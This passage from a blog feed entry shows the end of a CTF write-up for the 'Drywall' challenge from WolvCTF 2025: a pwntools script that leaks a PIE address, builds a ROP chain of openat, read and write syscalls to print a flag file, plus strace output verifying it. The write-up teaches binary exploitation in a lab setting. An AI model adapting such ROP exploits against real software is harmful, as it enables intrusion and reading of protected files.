+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">info</span><span class="sh">'</span> 
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
+<span class="c1">#p = remote('ip_addr', port)
+</span><span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">What is your name, epic H4x0r?</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/home/user/flag.txt</span><span class="se">\0</span><span class="sh">'</span><span class="p">)</span> 
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&lt;|;)</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">main_leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">strip</span><span class="p">()</span>
+<span class="n">main_addr</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">main_leak</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Leaked main address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">main_offset</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">main</span><span class="sh">'</span><span class="p">]</span>
+<span class="n">binary_base</span> <span class="o">=</span> <span class="n">main_addr</span> <span class="o">-</span> <span class="n">main_offset</span>
+<span class="n">name_offset</span> <span class="o">=</span> <span class="mh">0x4050</span>
+<span class="n">name_addr</span> <span class="o">=</span> <span class="n">binary_base</span> <span class="o">+</span> <span class="n">name_offset</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">PIE base: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">binary_base</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">name address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">name_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="c1"># Gadgets
+</span><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="n">binary_base</span> <span class="o">+</span> <span class="mh">0x13db</span>
+<span class="n">pop_rdx_ret</span> <span class="o">=</span> <span class="n">binary_base</span> <span class="o">+</span> <span class="mh">0x1199</span>
+<span class="n">pop_rsi_pop_r15_ret</span> <span class="o">=</span> <span class="n">binary_base</span> <span class="o">+</span> <span class="mh">0x13d9</span>
+<span class="n">pop_rax_ret</span> <span class="o">=</span> <span class="n">binary_base</span> <span class="o">+</span> <span class="mh">0x119b</span>
+<span class="n">syscall_ret</span> <span class="o">=</span> <span class="n">binary_base</span> <span class="o">+</span> <span class="mh">0x119d</span>
+
+<span class="n">AT_FDCWD</span> <span class="o">=</span> <span class="o">-</span><span class="mi">100</span>  <span class="c1"># 0xffffff9c for openat
+</span><span class="n">O_RDONLY</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="c1"># ROP chain
+</span><span class="n">rop</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
+
+<span class="c1"># openat(AT_FDCWD, name_addr, O_RDONLY)
+</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">AT_FDCWD</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_pop_r15_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">name_addr</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># junk for r15
+</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">O_RDONLY</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">257</span><span class="p">)</span>  <span class="c1"># openat
+</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span>
+
+<span class="c1"># read and write
+</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>  
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_pop_r15_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">name_addr</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># syscall read
+</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span>
+
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># syscall write
+</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">280</span>  
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">rop</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="flag-in-sight-">Flag in Sight! 🎯</h2>
+
+<p>Running the exploit…</p>
+
+<p><img src="/assets/images/exploits/drywall.png" alt="exploit screenshot" /></p>
+
+<p>Mission accomplished.</p>
+
+<hr />
+
+<h2 id="locally-testing-syscalls">Locally Testing Syscalls</h2>
+
+<p>To check if <code class="language-plaintext highlighter-rouge">openat</code>, <code class="language-plaintext highlighter-rouge">read</code>, and <code class="language-plaintext highlighter-rouge">write</code> are functioning correctly, you can run the exploit locally with <code class="language-plaintext highlighter-rouge">strace</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strace <span class="nt">-f</span> <span class="nt">-e</span> <span class="nv">trace</span><span class="o">=</span>openat,read,write python3 local.py
+</code></pre></div></div>
+
+<p>Sample output:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[pid 124153] openat(-1709061504, "/home/user/flag.txt", O_RDONLY) = 3
+[pid 124153] read(3, "{Fake_flag}\n", 256) = 12
+[pid 124153] write(1, "{Fake_flag}\nflag.txt\0\n\0\0\0..."..., 256) = 256
+[pid 124153] --- SIGSEGV ---
+[pid 124154] read(8, "{Fake_flag}\nflag.txt\0\n\0..."..., 4096) = 256
+{Fake_flag}
+[pid 124154] write(1, "{Fake_flag}"..., ...) = 22
+</code></pre></div></div>
+
+<p>This helps verify syscall correctness before trying on remote.</p>
+
+<hr />]]></content><author><name>NopNop0x90</name></author><category term="PWN" /><category term="userland" /><category term="pwn" /><category term="binary-exploitation" /><category term="ROP" /><summary type="html"><![CDATA[Detailed writeup of the Drywall challenge from WolvCTF 2025 covering ROP chain development and exploit mitigation bypass.]]></summary></entry></feed>
